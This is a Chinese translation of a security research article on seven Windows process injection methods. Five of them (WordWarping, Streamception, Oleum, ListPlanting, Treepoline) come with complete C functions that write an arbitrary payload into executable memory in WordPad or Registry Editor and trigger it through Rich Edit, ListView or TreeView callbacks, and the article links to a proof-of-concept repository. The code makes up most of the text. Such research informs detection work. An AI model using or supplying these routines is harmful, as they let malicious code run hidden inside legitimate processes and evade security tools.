# 实现 Windows 进程注入的 7 种新方法

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [https://www.4hou.com/system/17735.html](https://www.4hou.com/system/17735.html)


导语：在上周，[@hexacorn ]() 提出了 7 种新型的攻击方式，以 “粉碎式攻击” 的方法来实现代码注入或重定向。在本文中，我们将具体讨论这些新型注入方法，并提供一些可用的示例。

**简介**

在这里，我们主要对 [@hexacorn ]() 上周发布的代码注入 / 进程注入相关的文章进行进一步的分析。在上周，[@hexacorn ]() 提出了 7 种新型的攻击方式，以 “粉碎式攻击” 的方法来实现代码注入或重定向。在本文中，我们将具体讨论这些新型注入方法，并提供一些可用的示例。前五种方法的示例都将使用 “Edit” 和“Rich Edit”控件，最后两个则使用 SysListView32 和 SysTreeView32。

**关于 Rich Edit 控件**

要进行新型注入方法的尝试，我们可以选择遍历所有窗口，例如 EnumWindows，从窗口句柄中检索类的名称，然后将字符串的开始部分与 “RICHEDIT” 进行比较。除了这种方法之外，我们还可以使用 FindWindow 或 FindWindowEX 手动查找这些空间。我们所使用的环境是 Windows 10 的评估版本，因此我进行测试时使用的唯一应用程序就是 Wordpad（写字板），并找到其中的富文本控件 Rich Edit Control。要完成这一过程，只需要两行代码。

1. 获取 Wordpad 的主窗口

```
wpw = FindWindow(L"WordPadClass", NULL);
```

2. 找到 Rich Edit 控件

```
rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
```

**方法 1：WordWarping**

可以使用 EM_SETWORDBREAKPROC 消息来设置 Edit 或 Rich Edit 空间的文本包装器回调函数。通过 SendInput 或 PostMessage API 模拟键盘输入，可以触发回调函数的执行。这种注入方式在 16 年前就已经被用于在应用程序中提升特权。尽管没有针对该漏洞的 CVE 编号，但实际上，它可以被用于针对 McAfee、VirusScan、Sygate Personal Firewall Pro、WinVNC、Dameware 以及其他产品的漏洞利用。示例中的代码，就使用了 WordPad 实现注入代码，其具体步骤如下：

1. 获取 Wordpad 的主窗口；
2. 找到 Wordpad 的 Rich Edit 控件；
3. 尝试获取 Wordwrap 函数的当前地址；
4. 获取 Wordpad 的进程 ID；
5. 尝试打开该进程；
6. 为 Payload 分配 RWX 内存；
7. 将 Payload 写入内存；
8. 更新回调过程；
9. 模拟键盘输入，以触发 Payload；
10. 恢复原始 Wordwrap 功能（如果存在）；
11. 释放内存并关闭进程句柄。

```
VOID wordwarping(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, rew;
    LPVOID        cs, wwf;
    SIZE_T        rd, wr;
    INPUT         ip;
   
    // 1. Get main window for wordpad.
    //    This will accept simulated keyboard input.
    wpw = FindWindow(L"WordPadClass", NULL);
   
    // 2. Find the rich edit control for wordpad.
    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
 
    // 3. Try get current address of Wordwrap function
    wwf = (LPVOID)SendMessage(rew, EM_GETWORDBREAKPROC, 0, 0);
 
    // 4. Obtain the process id for wordpad.
    GetWindowThreadProcessId(rew, &id);
 
    // 5. Try open the process.
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
 
    // 6. Allocate RWX memory for the payload.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
    // 7. Write the payload to memory
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
 
    // 8. Update the callback procedure
    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)cs);
 
    // 9. Simulate keyboard input to trigger payload
    ip.type           = INPUT_KEYBOARD;
    ip.ki.wVk         = 'A';
    ip.ki.wScan       = 0;
    ip.ki.dwFlags     = 0;
    ip.ki.time        = 0;
    ip.ki.dwExtraInfo = 0;
   
    SetForegroundWindow(rew);
    SendInput(1, &ip, sizeof(ip));
 
    // 10. Restore original Wordwrap function (if any)
    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)wwf);
   
    // 11. Free memory and close process handle
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}
```

**方法 2：Hyphentension**

```
typedef struct tagHyphenateInfo {
  SHORT cbSize;
  SHORT dxHyphenateZone;
  void((WCHAR *,LANGID, long,HYPHRESULT *) * )pfnHyphenate;
} HYPHENATEINFO;
```

可以通过发送带有指向 HYPHENATEINFO 结构的指针的 EM_GETHYPHENATEINFO 消息，来获取有关 Rich Edit 空间 Hyphenation 信息。但是，该方法假定指向结构的指针是本地内存，因此攻击者必须在使用 SendMessage 或 PostMessage 发送 EM_GETHYPHENATEINFO 之前，借助 VirtualAllocEx 为信息分配内存。在使用 EM_SETHYPHENATEINFO 之前，可能需要设置 Edit 空间的排版（Typography）选项。尽管我们无法使用写字板实现这一点，但我们推测，诸如 Microsoft Word 这样功能丰富的文字处理器应该是可行的。

**方法 3：AutoCourgette**

根据 MSDN 上提供的信息，EM_SETAUTOCORRECTPROC 消息所支持的客户端最低版本是 Windows 8，因此它是一个相对较新的功能。写字板显然不支持自动校正，所以我无法实现该方法的利用。像第二种方法 Hyphenation 一样，这种方法可能会适用于 Microsoft Word。

**方法 4：Streamception**

```
typedef struct _editstream {
  DWORD_PTR          dwCookie;
  DWORD              dwError;
  EDITSTREAMCALLBACK pfnCallback;
} EDITSTREAM;
```

当 Rich Edit 空间收到 EM_STREAMIN 消息时，它使用 EDITSTREAM 结构中提供的信息，将数据流传入或传出控件。pfnCallback 字段的类型为 EDITSTREAMCALLBACK，可以指向内存中的 Payload。我们确保 EDITSTREAMCALLBACK 会返回一个非零值，从而指示错误的存在，但最终，Rich Edit 空间中的内容仍然会被删除。这一方法可以正常工作，但不会破坏现有的缓冲流。我们推测，可能有方法能够解决这一问题，但目前我们仍然在深入调查的过程中。

该方法的具体步骤如下：

1. 获取窗口句柄；
2. 获取进程 ID 并尝试打开进程；
3. 分配 RWX 内存，并在该位置复制 Payload；
4. 分配 RW 内存，并在该位置复制 EDITSTREAM 结构；
5. 使用 EM_STREAMIN 触发 Payload；
6. 释放内存并关闭进程句柄。

```
VOID streamception(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, rew;
    LPVOID        cs, ds;
    SIZE_T        rd, wr;
    EDITSTREAM    es;
   
    // 1. Get window handles
    wpw = FindWindow(L"WordPadClass", NULL);
    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
   
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(rew, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
 
    // 3. Allocate RWX memory and copy the payload there.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
 
    // 4. Allocate RW memory and copy the EDITSTREAM structure there.
    ds = VirtualAllocEx(hp, NULL, sizeof(EDITSTREAM),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
       
    es.dwCookie    = 0;
    es.dwError     = 0;
    es.pfnCallback = cs;
   
    WriteProcessMemory(hp, ds, &es, sizeof(EDITSTREAM), &wr);
   
    // 5. Trigger payload with EM_STREAMIN
    SendMessage(rew, EM_STREAMIN, SF_TEXT, (LPARAM)ds);
 
    // 6. Free memory and close process handle
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}
```

**方法 5：Oleum**

在完成前四个方法的研究之后，我开始研究 EM_SETOLECALLBACK 这个潜在的方法。大概是在同一时间，Adam 也更新了他的博客，说发现了这一方法。EM_GETOLECALLBACK 消息似乎没有很好地进行记录，如果 LPARAM 没有指向本地可访问的内存，当发送到带有 SendMessage 的 Rich Edit 窗口时，将会发生崩溃。此外，EM_GETOLECALLBACK 没有按预期返回指向 IRichEditOleCallback 的指针，它返回了一个指向 IRichEditOle 的指针。因此，我没有使用 EM_SETOLECALLBACK。相反，保存 IRichEditOle.lpVtbl 的堆内存将被一个地址覆盖到原始表的副本，其中一个方法指向 Payload，在我们的示例中具体是 GetClipboardData。

由于虚拟函数表仅位于只读内存中，所以我们无法实现对它的覆盖。也许有读者会说，可以在更改内存保护后实现对其的覆盖，但我并不推荐这种方法。我们可以制作副本，更新一个条目，并简单地重定向执行，这样可能会更有意义。

```
typedef struct _IRichEditOle_t {
    ULONG_PTR QueryInterface;
    ULONG_PTR AddRef;
    ULONG_PTR Release;
    ULONG_PTR GetClientSite;
    ULONG_PTR GetObjectCount;
    ULONG_PTR GetLinkCount;
    ULONG_PTR GetObject;
    ULONG_PTR InsertObject;
    ULONG_PTR ConvertObject;
    ULONG_PTR ActivateAs;
    ULONG_PTR SetHostNames;
    ULONG_PTR SetLinkAvailable;
    ULONG_PTR SetDvaspect;
    ULONG_PTR HandsOffStorage;
    ULONG_PTR SaveCompleted;
    ULONG_PTR InPlaceDeactivate;
    ULONG_PTR ContextSensitiveHelp;
    ULONG_PTR GetClipboardData;
    ULONG_PTR ImportDataObject;
} _IRichEditOle;
```

下面的代码中，使用 WordPad 作为示例，因为我在使用 EM_SETOLECALLBACK 消息的 Windows 的评估版本上找不到任何其他可以使用的应用程序。该过程会将 Payload 的地址替换为 GetClipboardData 的地址，然后将 WM_COPY 发送到 Rich Edit 窗口。

具体步骤如下：

1. 获取窗口句柄；
2. 获取进程 ID 并尝试打开进程；
3. 分配 RWX 内存，并在该位置复制 Payload；
4. 为当前地址分配 RW 内存；
5. 查询界面；
6. 读取内存地址；
7. 读取 IRichEditOle.lpVtbl；
8. 读取虚拟函数表；
9. 为虚拟函数表的副本分配内存；
10. 将 GetClipboardData 方法设置为 Payload 的地址；
11. 将新的虚拟函数表写入远程内存；
12. 更新 IRichEditOle.lpVtbl；
13. 通过调用 GetClipboardData 方法触发 Payload；
14. 恢复 IRichEditOle.lpVtbl 的原始值；
15. 释放内存并关闭进程句柄。

```
VOID oleum(LPVOID payload, DWORD payloadSize) {
    HANDLE                hp;
    DWORD                 id;
    HWND                  rew;
    LPVOID                cs, ds, ptr, mem, tbl;
    SIZE_T                rd, wr;
    _IRichEditOle         reo;
   
    // 1. Get the window handle
    rew = FindWindow(L"WordPadClass", NULL);
    rew = FindWindowEx(rew, NULL, L"RICHEDIT50W", NULL);
   
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(rew, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
 
    // 3. Allocate RWX memory and copy the payload there
    cs = VirtualAllocEx(hp, NULL, payloadSize,
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
   
    // 4. Allocate RW memory for the current address
    ptr = VirtualAllocEx(hp, NULL, sizeof(ULONG_PTR),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
    // 5. Query the interface
    SendMessage(rew, EM_GETOLEINTERFACE, 0, (LPARAM)ptr);
   
    // 6. Read the memory address
    ReadProcessMemory(hp, ptr, &mem, sizeof(ULONG_PTR), &wr);
 
    // 7. Read IRichEditOle.lpVtbl
    ReadProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);
 
    // 8. Read virtual function table
    ReadProcessMemory(hp, tbl, &reo, sizeof(_IRichEditOle), &wr);
 
    // 9. Allocate memory for copy of virtual table
    ds = VirtualAllocEx(hp, NULL, sizeof(_IRichEditOle),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
    // 10. Set the GetClipboardData method to address of payload
    reo.GetClipboardData = (ULONG_PTR)cs;
   
    // 11. Write new virtual function table to remote memory
    WriteProcessMemory(hp, ds, &reo, sizeof(_IRichEditOle), &wr);
   
    // 12. update IRichEditOle.lpVtbl
    WriteProcessMemory(hp, mem, &ds, sizeof(ULONG_PTR), &wr);
   
    // 13. Trigger payload by invoking the GetClipboardData method
    PostMessage(rew, WM_COPY, 0, 0);
   
    // 14. Restore original value of IRichEditOle.lpVtbl
    WriteProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);
   
    // 15. Free memory and close process handle
    VirtualFreeEx(hp, ptr,0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
   
    CloseHandle(hp);  
}
```

**方法 6：ListPlanting**

可以使用 LVM_SORTGROUPS、LVM_INSERTGROUPSORTED 和 LVM_SORTITEMS 消息，自定义 ListView 控件中的项目 / 组。以下结构将用于 LVM_INSERTGROUPSORTED。

```
typedef struct tagLVINSERTGROUPSORTED {
  PFNLVGROUPCOMPARE pfnGroupCompare;
  void              *pvData;
  LVGROUP           lvGroup;
} LVINSERTGROUPSORTED, *PLVINSERTGROUPSORTED;
```

下面的代码中，使用注册表编辑器和 LVM_SORTITEMS 来触发 Payload。在这里，存在一个问题，就是这一过程会为列表中的每一项调用回调函数。如果列表中没有项目，那么根本不会调用该函数。实际上，我们可以想办法解决这一问题，例如检查列表中有多少项目、添加项目、删除项目、使用传递给回调函数的参数等。

具体步骤如下：

1. 获取窗口句柄；
2. 获取进程 ID 并尝试打开进程；
3. 分配 RWX 内存并在该位置复制 Payload；
4. 触发 Payload；
5. 释放内存并关闭进程句柄。

```
VOID listplanting(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          lvm;
    LPVOID        cs;
    SIZE_T        wr;
   
    // 1. get the window handle
    lvm = FindWindow(L"RegEdit_RegEdit", NULL);
    lvm = FindWindowEx(lvm, 0, L"SysListView32", 0);
  
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(lvm, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
 
    // 3. Allocate RWX memory and copy the payload there.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
   
    // 4. Trigger payload
    PostMessage(lvm, LVM_SORTITEMS, 0, (LPARAM)cs);
   
    // 5. Free memory and close process handle
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}
```

**方法 7：Treepoline**

```
typedef struct tagTVSORTCB {
  HTREEITEM    hParent;
  PFNTVCOMPARE lpfnCompare;
  LPARAM       lParam;
} TVSORTCB, *LPTVSORTCB;
```

可以通过 TVM_SORTCHILDRENCB 消息实现自定义排序。对于每个项目，将会执行 Payload，因此还需要进行额外检查，以避免运行多个实例。在获取 TreeListView 窗口句柄后，我们需要做的第一件事情是获取根项目。在调用回调函数之前，我们就需要其中的一个项目。

具体步骤如下：

1. 获取 treeview 句柄；
2. 获取进程 ID 并尝试打开进程；
3. 分配 RWX 内存，并在该位置复制 Payload；
4. 获取树列表中的根项目；
5. 分配 RW 内存，并复制 TVSORTCB 结构；
6. 触发 Payload；
7. 释放内存并关闭进程句柄。

```
// requires elevated privileges
VOID treepoline(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, tlv;
    LPVOID        cs, ds, item;
    SIZE_T        rd, wr;
    TVSORTCB      tvs;
   
    // 1. get the treeview handle
    wpw = FindWindow(L"RegEdit_RegEdit", NULL);
    tlv = FindWindowEx(wpw, 0, L"SysTreeView32", 0);
   
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(tlv, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
 
    // 3. Allocate RWX memory and copy the payload there.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
       
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
   
    // 4. Obtain the root item in tree list
    item = (LPVOID)SendMessage(tlv, TVM_GETNEXTITEM, TVGN_ROOT, 0);
 
    tvs.hParent     = item;
    tvs.lpfnCompare = cs;
    tvs.lParam      = 0;
   
    // 5. Allocate RW memory and copy the TVSORTCB structure
    ds = VirtualAllocEx(hp, NULL, sizeof(TVSORTCB),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
       
    WriteProcessMemory(hp, ds, &tvs, sizeof(TVSORTCB), &wr);
   
    // 6. Trigger payload
    SendMessage(tlv, TVM_SORTCHILDRENCB, 0, (LPARAM)ds);
 
    // 7. Free memory and close process handle
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
   
    CloseHandle(hp);
}
```

**PoC**

[https://github.com/odzhan/injection/tree/master/richedit](https://github.com/odzhan/injection/tree/master/richedit)
